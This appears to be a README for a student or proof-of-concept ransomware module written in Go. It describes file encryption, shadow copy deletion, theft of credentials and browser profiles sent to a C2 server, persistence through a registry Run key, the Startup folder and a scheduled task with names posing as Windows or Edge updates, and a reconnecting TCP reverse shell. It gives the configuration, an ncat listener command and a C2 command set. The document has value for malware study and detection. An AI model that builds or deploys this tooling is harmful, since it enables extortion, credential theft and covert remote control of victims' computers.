# Ransomware Module

Encryption engine implementing modern ransomware capabilities: AES-GCM encryption, persistence mechanisms, and Command and Control (C2) communication.

> [!CAUTION]
> **Security Notice**
> For security reasons, some parts of the original code have been replaced with placeholders. 

## Module Architecture

```
ransomware/
├── main.go                 # Main orchestrator
├── config/
│   ├── config.go          # System configuration
│   └── helpers.go         # Auxiliary functions
├── core/
│   └── encryption.go      # AES-256-GCM encryption engine (Redacted)
└── utils/
    ├── infostealer.go     # System information gathering
    ├── obfuscation.go     # Command obfuscation techniques
    ├── persistence.go     # Persistence mechanisms
    ├── reverse.go         # Reverse shell for C2
    └── shadowcopy.go      # Shadow copy deletion (Redacted)
```

## Ransomware Capabilities (Theoretical/Demonstrated)

- **File Encryption (Redacted)**: Encrypts files using AES-256-GCM with a key derived via SHA-256. Recursively scans configured directories, filters by specific extensions, appends a `.file` extension, and drops ransom notes.
- **Shadow Copy Deletion (Redacted)**: Deletes Windows Volume Shadow Copies using dynamically obfuscated `vssadmin` and `wmic` commands to evade detection, preventing native system recovery.
- **Information Gathering**: Extracts sensitive data from the compromised system including hardware specs, network configuration, installed software, browser profiles, saved credentials, environment variables, and filesystem structure. Data is structured in JSON and sent to the C2 server.
- **Persistence**: Establishes **3 methods of persistence** for automatic execution on startup:
  - **Registry Run Key:** `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
  - **Startup Folder:** Copies executable to the user's Startup folder.
  - **Scheduled Task:** Creates a task triggering on user logon.
- **Obfuscation**: Applies multiple layers of obfuscation (Base64, XOR, ROT-N) to sensitive system commands and strings.
- **C2 Server Communication**: Establishes a persistent TCP reverse shell with automatic reconnection capabilities, allowing the C2 server to execute special instructions and native system commands.

## Configuration

Edit `config/config.go` to customize the behavior:

```go
const (
	EnableDebugMode          = false                           // true = debug messages, false = silent mode
	EnableReverseShell       = true                            // true = active reverse shell
	EnableShadowCopyDeletion = true                            // true = delete shadow copies
	EnablePersistence        = true                            // true = establish persistence
	EnableInfoStealer        = true                            // true = gather info
	ReverseShellRetryDelay   = 5                               // reconnection delay in seconds
	ReverseShellServer       = "192.168.72.1:9090"             // Reverse shell server IP:PORT
	EncryptionKey            = "my-secret-encryption-key-123"  // Key used when EnableReverseShell=false
)
```

## Usage

### Setting up the C2 Server
Start the listener before executing the ransomware:

```bash
ncat -lv 9090
```

### Running the Ransomware
```powershell
cd ransomware
.\ejercicio1.exe
```

### C2 Server Commands
Once connected, the server can send specific commands:

**Special Commands**:
```bash
SET_KEY:MyCustomKey2024      # Configure encryption key
START_ENCRYPTION             # Start file encryption (disabled in this PoC)
ENABLE_PERSISTENCE           # Activate persistence mechanisms
DISABLE_PERSISTENCE          # Deactivate persistence
STEAL_INFO                   # Gather system information
DELETE_SHADOW_COPIES         # Delete backups (disabled in this PoC)
EXIT                         # Close reverse shell
```

**Native System Commands**:
Native commands (like `whoami`, `ipconfig`, `tasklist`, `powershell Get-Process`) are executed directly on the compromised host.

## Verifying and Removing Persistence

To **verify** the persistence mechanisms via PowerShell:
```powershell
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSecurityUpdate" -EA SilentlyContinue
Test-Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.exe"
Get-ScheduledTask -TaskName "MicrosoftEdgeUpdateTask" -EA SilentlyContinue
```

To **remove** them from the C2 server:
```bash
DISABLE_PERSISTENCE
```
